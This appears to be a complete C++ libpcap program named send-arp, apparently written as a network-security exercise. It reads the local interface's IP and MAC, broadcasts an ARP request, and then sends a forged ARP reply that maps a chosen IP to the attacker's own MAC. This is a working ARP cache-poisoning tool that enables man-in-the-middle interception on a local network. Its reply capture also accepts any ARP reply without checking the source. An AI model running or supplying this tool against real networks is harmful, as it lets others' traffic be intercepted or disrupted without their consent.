#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

Ip local_ip;
Mac local_mac;

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void get_device(const char* devname) {
    pcap_if_t *alldevsp, *device;
    char errbuf[PCAP_ERRBUF_SIZE];

    if (pcap_findalldevs(&alldevsp, errbuf)) {
        printf("Error: %s\n", errbuf);
        exit(1);
    }

    for (device = alldevsp; device != NULL; device = device->next) {
        if (strcmp(device->name, devname) == 0) {            
            pcap_addr_t *addr;
            for (addr = device->addresses; addr != NULL; addr = addr->next) {
                if (addr->addr->sa_family == AF_INET) {
                    local_ip = Ip(ntohl(((struct sockaddr_in *)addr->addr)->sin_addr.s_addr));    
                } 
            }

            int sockfd;
            struct ifreq ifr;

            sockfd = socket(AF_INET, SOCK_DGRAM, 0);
            if (sockfd == -1) {
                perror("Socket creation failed");
                return;
            }

            strncpy(ifr.ifr_name, devname, IFNAMSIZ - 1);
            if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
                perror("ioctl failed");
                close(sockfd);
                return;
            }

            close(sockfd);

            unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
            uint8_t tmp_mac[6] = { mac[0], mac[1], mac[2], mac[3], mac[4], mac[5] };
            local_mac = Mac(tmp_mac);

            break;
        }
    }

    pcap_freealldevs(alldevsp);
}

void send_arp(pcap_t* handle, int op, Mac targetMac, Mac sourceMac, Ip targetIp, Ip sourceIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = targetMac;
    packet.eth_.smac_ = sourceMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op);
    packet.arp_.smac_ = sourceMac;
    packet.arp_.sip_ = htonl(sourceIp);
    packet.arp_.tmac_ = (op == ArpHdr::Request) ? Mac("00:00:00:00:00:00") : targetMac;
    packet.arp_.tip_ = htonl(targetIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    } else {
        printf("Sent ARP %s: %s -> %s\n", (op == ArpHdr::Request ? "Request" : "Reply"),
               ((std::string)sourceIp).c_str(), ((std::string)targetIp).c_str());
    }
}

Mac capture_arp_reply(pcap_t* handle, const Ip& sender_ip) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    while ((res = pcap_next_ex(handle, &header, &packet)) >= 0) {
        if (res == 0) continue;
        EthArpPacket* eth_arp_packet = (EthArpPacket*)packet;

        if (ntohs(eth_arp_packet->eth_.type_) == EthHdr::Arp) {
            printf("Captured an ARP packet\n");

            if (ntohs(eth_arp_packet->arp_.op_) == ArpHdr::Reply) {
                printf("ARP Reply captured\n");
                uint32_t captured_sip = ntohl(eth_arp_packet->arp_.sip_);
                return eth_arp_packet->arp_.smac_;
            }
        }
    }

    printf("No valid ARP reply captured\n");
    return Mac();  
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    get_device(dev);
    printf("Local IP: %s, Local MAC: %s\n", ((std::string)local_ip).c_str(), ((std::string)local_mac).c_str());

    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i + 1]);

        send_arp(handle, ArpHdr::Request, Mac("ff:ff:ff:ff:ff:ff"), local_mac, target_ip, local_ip);
        Mac sender_mac = capture_arp_reply(handle, sender_ip);
        send_arp(handle, ArpHdr::Reply, sender_mac, local_mac, target_ip, sender_ip);
    }

    pcap_close(handle);
    return 0;
}
